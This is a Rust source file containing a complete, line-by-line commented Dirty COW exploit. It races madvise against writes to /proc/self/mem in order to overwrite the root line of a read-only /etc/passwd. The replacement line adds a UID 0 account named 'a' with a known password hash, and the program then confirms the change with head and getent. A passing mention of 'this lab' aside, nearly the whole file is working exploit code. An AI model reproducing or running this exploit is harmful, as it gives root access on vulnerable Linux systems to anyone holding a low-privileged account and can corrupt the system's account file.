// Import `File` for simple file reads, and `OpenOptions` for configurable open modes.
// We need `OpenOptions` because the exploit opens `/etc/passwd` read-only and later opens `/proc/self/mem` read-write.
use std::fs::{File, OpenOptions};

// Import seek/write traits and buffered line-reading helpers.
// `Seek` and `SeekFrom` let us move to the mapped virtual address inside `/proc/self/mem`.
// `Write` gives us `write_all`, used to repeatedly write the payload bytes.
// `BufReader` and `BufRead` are used to read the first line of `/etc/passwd` during verification.
use std::io::{Seek, SeekFrom, Write, BufReader, BufRead};

// Import `AsRawFd` so Rust can expose the underlying Unix file descriptor for `/etc/passwd`.
// `libc::mmap` is a C syscall wrapper and expects a raw file descriptor, not a Rust `File` object.
use std::os::unix::io::AsRawFd;

// Import `ptr` so we can pass `ptr::null_mut()` to `mmap`.
// A null pointer here tells the kernel: choose the mapping address for us.
use std::ptr;

// Import atomics and Arc for safe shared stop-flags between threads.
// `Arc` provides shared ownership across threads.
// `AtomicBool` provides thread-safe true/false flags without a mutex.
// `Ordering` controls how strictly the CPU/compiler must order atomic reads/writes.
use std::sync::{atomic::{AtomicBool, Ordering}, Arc};

// Import Rust threading support.
// The exploit needs two racing threads: one `madvise` thread and one `/proc/self/mem` writer thread.
use std::thread;

// Import timing utilities.
// `Instant` measures elapsed time for the race timeout.
// `Duration` represents fixed spans such as 10 seconds or 5 milliseconds.
use std::time::{Duration, Instant};

// Import `Command` so the program can run diagnostic shell commands after the overwrite lands.
// Here it runs `head` and `getent` to show the modified passwd entry.
use std::process::Command;

// Program entry point.
// `std::io::Result<()>` lets us use `?` on I/O operations and return OS errors cleanly.
fn main() -> std::io::Result<()> {
    // The protected file targeted by this Dirty COW variant.
    // `/etc/passwd` is normally world-readable but not world-writable.
    let target_path = "/etc/passwd";

    // The temporary account name created by the overwrite.
    // It is intentionally one character long to fit the strict 32-byte payload geometry.
    let login_name = "a";

    // The payload must be exactly the same length as the original first line of `/etc/passwd`.
    // Dirty COW performs an overwrite here, not an insertion.
    // If the replacement is too long, it corrupts the next line.
    // If it is too short, garbage from the old line remains.
    // Original root line length used in this lab:
    // `root:x:0:0:root:/root:/bin/bash\n` = 32 bytes.
    // Replacement line:
    // `a:aafKPWZb/dLAs:0:0:.:/:/bin/sh\n` = 32 bytes.
    // Field breakdown:
    // `a` = username.
    // `aafKPWZb/dLAs` = DES `crypt(3)` hash for password `a` using salt `aa`.
    // `0` = UID 0, root-equivalent user.
    // `0` = GID 0, root group.
    // `.` = shortened GECOS/comment field.
    // `/` = home directory.
    // `/bin/sh` = login shell.
    let payload_str = "a:aafKPWZb/dLAs:0:0:.:/:/bin/sh\n";

    // Convert the Rust string into owned raw bytes.
    // `/proc/self/mem` writes bytes, not high-level Rust strings.
    // `as_bytes()` gives a borrowed byte slice, and `to_vec()` copies it into an owned `Vec<u8>`.
    let p_bytes = payload_str.as_bytes().to_vec();

    // Safety check for the exploit geometry.
    // If this assertion fails, the payload no longer fits the original root line exactly.
    // That would make the exploit more likely to corrupt `/etc/passwd` rather than produce a usable UID 0 account.
    assert_eq!(p_bytes.len(), 32, "Geometry Fail: Payload must be exactly 32 bytes");

    // Open `/etc/passwd` read-only.
    // This models the attack condition: the low-privileged user can read the file but should not be able to write it.
    // The `?` operator returns the error if the file cannot be opened.
    let file = OpenOptions::new().read(true).open(target_path)?;

    // Map the first page of `/etc/passwd` into this process's virtual memory.
    // This is unsafe because `mmap` is a raw C interface and Rust cannot verify pointer validity or lifetime rules.
    let map = unsafe {
        // Call the libc wrapper for the Unix `mmap` syscall.
        libc::mmap(
            // Ask the kernel to choose the virtual address for the mapping.
            ptr::null_mut(),

            // Map 4096 bytes: one normal memory page on this system.
            // The root line is at the start of the file, so one page is enough.
            4096,

            // Map it as readable only.
            // There is no `PROT_WRITE` here, so ordinary writes should not be allowed.
            libc::PROT_READ,

            // Use a private copy-on-write mapping.
            // Correct behaviour: writes should go to a private copy, not the original file.
            libc::MAP_PRIVATE,

            // Pass the raw Unix file descriptor for `/etc/passwd`.
            file.as_raw_fd(),

            // Start mapping from offset 0, meaning the beginning of `/etc/passwd`.
            0,
        )
    };

    // Check whether `mmap` failed.
    // On failure, `mmap` returns `MAP_FAILED`, not a Rust `Result`.
    if map == libc::MAP_FAILED {
        // Convert the operating-system error into a Rust I/O error and return it.
        return Err(std::io::Error::last_os_error());
    }

    // Print a banner so the operator knows which exploit version is running.
    println!("[*] Pivot: MANUAL PROOF FINALIST (v17)");

    // Shared flag controlling the lifetime of the `madvise` thread.
    // It starts as `true`, meaning the thread should keep racing.
    let running_madvise = Arc::new(AtomicBool::new(true));

    // Shared flag controlling the lifetime of the `/proc/self/mem` writer thread.
    // It also starts as `true` and is flipped to `false` during cleanup.
    let running_write = Arc::new(AtomicBool::new(true));

    // Store the mapping address as an integer so it can be moved into both spawned threads.
    // Raw pointers are not always convenient to send across thread boundaries.
    // Each thread later casts this integer back into a pointer or address.
    let map_usize = map as usize;

    // THREAD 1: MADVISE
    // This thread repeatedly tells the kernel that the mapped page is no longer needed.
    // That causes the page table entry to be discarded, forcing the page to be faulted back in later.
    let r1 = running_madvise.clone();

    // Spawn the `madvise` racing thread.
    // `move` transfers ownership of `r1` and `map_usize` into the closure.
    let h1 = thread::spawn(move || {
        // Keep racing while the shared atomic flag is true.
        while r1.load(Ordering::SeqCst) {
            // Call `madvise` on the mapped page.
            // This is unsafe because it uses a raw pointer and a C syscall wrapper.
            unsafe {
                libc::madvise(
                    // Convert the saved integer address back into a mutable C void pointer.
                    // `madvise` takes `*mut c_void` even though it does not write user data directly here.
                    map_usize as *mut libc::c_void,

                    // Advise one page.
                    4096,

                    // Tell the kernel the page is not needed.
                    // In the Dirty COW race, this invalidates the page table entry at just the wrong time.
                    libc::MADV_DONTNEED,
                );
            }

            // Yield to the scheduler so the writer thread gets chances to interleave.
            // This can help the two threads race rather than one monopolising CPU time.
            thread::yield_now();
        }
    });

    // THREAD 2: WRITE
    // This thread repeatedly writes the 32-byte payload into the mapped address through `/proc/self/mem`.
    let r2 = running_write.clone();

    // Clone the payload bytes so the writer thread owns its own copy.
    // The spawned thread must not borrow stack data that may go out of scope.
    let p_vec = p_bytes.clone();

    // Spawn the `/proc/self/mem` writer thread.
    // This is the second half of the Dirty COW race.
    let h2 = thread::spawn(move || {
        // Open this process's own memory pseudo-file for reading and writing.
        // `/proc/self/mem` exposes the process virtual address space as a file-like object.
        if let Ok(mut mem_file) = OpenOptions::new().read(true).write(true).open("/proc/self/mem") {
            // Keep trying while the shared atomic flag is true.
            while r2.load(Ordering::SeqCst) {
                // Seek to the virtual address returned by `mmap`.
                // This makes the next write target the mapped `/etc/passwd` page.
                let _ = mem_file.seek(SeekFrom::Start(map_usize as u64));

                // Attempt to write the payload bytes at that virtual address.
                // Correct behaviour would keep this from modifying the real file.
                // On a vulnerable Dirty COW kernel, the race can make this land in the file's page cache.
                let _ = mem_file.write_all(&p_vec);

                // Yield to increase interleaving with the `madvise` thread.
                thread::yield_now();
            }
        }
    });

    // Record the start time of the race.
    // Used to enforce a timeout so the exploit does not run forever.
    let start = Instant::now();

    // Maximum time to try the race before giving up.
    // Ten seconds is long enough for repeated attempts but short enough to avoid endless hammering.
    let timeout = Duration::from_secs(10);

    // Tracks whether the exploit successfully modified `/etc/passwd`.
    let mut landed = false;

    // RACE LOOP
    // The two worker threads are racing in the background.
    // This loop repeatedly checks whether the first line of `/etc/passwd` now matches the payload.
    loop {
        // Stop if the timeout has been exceeded.
        if start.elapsed() > timeout {
            // Report failure to land the race within the allowed time.
            println!("\n[-] Timeout. Race did not land.");
            break;
        }

        // Buffer for the first line of `/etc/passwd`.
        let mut check_line = String::new();

        // Try to open the target file normally for reading.
        // This reads the actual file, not merely the private mapping.
        if let Ok(f) = File::open(target_path) {
            // Read only the first line, because the payload replaces the original root line.
            let _ = BufReader::new(f).read_line(&mut check_line);
        }

        // Check whether the first line is exactly the intended payload.
        // Exact match means the Dirty COW overwrite landed cleanly.
        if check_line == payload_str {
            // Print success and how long the race took.
            println!("\n[+] MATCH! Entry landed in {:?}", start.elapsed());

            // Record success for later control flow.
            landed = true;

            // Exit the verification loop.
            break;
        }

        // Sleep briefly before checking again.
        // This reduces busy-waiting while the two race threads continue hammering.
        thread::sleep(Duration::from_millis(5));
    }

    // CLEANUP
    // Stop the `madvise` thread.
    running_madvise.store(false, Ordering::SeqCst);

    // Stop the `/proc/self/mem` writer thread.
    running_write.store(false, Ordering::SeqCst);

    // Wait for the `madvise` thread to exit.
    // Ignoring the result is acceptable here because this is cleanup/diagnostics code.
    let _ = h1.join();

    // Wait for the writer thread to exit.
    let _ = h2.join();

    // Unmap the page that was mapped with `mmap`.
    // This releases the virtual memory mapping from the process.
    unsafe {
        libc::munmap(map, 4096);
    }

    // If the race did not land, exit cleanly with success status from the program's perspective.
    // The exploit failed, but the program itself did not encounter an I/O error.
    if !landed {
        return Ok(());
    }

    // Wait briefly before diagnostics.
    // This gives the filesystem/account lookup path a moment to observe the changed file.
    thread::sleep(Duration::from_millis(500));

    // DIAGNOSTICS
    // These commands prove the overwrite landed and the new account can be resolved by system tools.
    println!("\n[*] --- DIAGNOSTICS ---");

    // Print a label for the first-line check.
    println!("[*] First line:");

    // Run `head -n 1 /etc/passwd` to show the modified first line.
    let _ = Command::new("head").arg("-n").arg("1").arg(target_path).status();

    // Print a label for account database lookup.
    println!("[*] getent passwd {}:", login_name);

    // Run `getent passwd a` to check whether the system account database recognises user `a`.
    let _ = Command::new("getent").arg("passwd").arg(login_name).status();

    // Print a footer for readability.
    println!("[*] -------------------\n");

    // Return success from `main`.
    Ok(())
}